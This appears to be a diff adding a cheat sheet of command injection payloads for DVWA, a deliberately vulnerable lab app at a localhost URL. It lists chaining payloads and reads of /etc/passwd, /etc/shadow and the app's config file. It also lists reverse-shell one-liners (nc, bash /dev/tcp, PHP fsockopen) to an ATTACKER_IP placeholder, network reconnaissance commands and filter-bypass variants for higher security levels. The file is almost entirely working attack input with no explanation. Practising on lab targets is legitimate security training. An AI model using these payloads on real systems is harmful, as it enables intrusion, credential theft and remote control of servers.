@@ -1,0 +1,39 @@
+# Command Injection Payloads for DVWA
+# URL: http://localhost:8081/vulnerabilities/exec/
+
+# Basic command chaining
+; ls -la
+; whoami
+; id
+; cat /etc/passwd
+; cat /etc/shadow
+
+# Using different operators
+127.0.0.1; ls
+127.0.0.1 && whoami
+127.0.0.1 | cat /etc/passwd
+127.0.0.1 || ls
+`ls`
+$(whoami)
+
+# Network reconnaissance
+; ifconfig
+; ip addr
+; netstat -an
+; cat /etc/hosts
+
+# Reverse Shell (replace IP)
+; nc -e /bin/bash ATTACKER_IP 4444
+; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# File operations
+; ls -la /var/www/html
+; cat /var/www/html/config/config.inc.php
+; find / -name "*.conf" 2>/dev/null
+
+# Bypasses for Medium/High security
+127.0.0.1|ls
+127.0.0.1|whoami
+;ls;
+|ls|
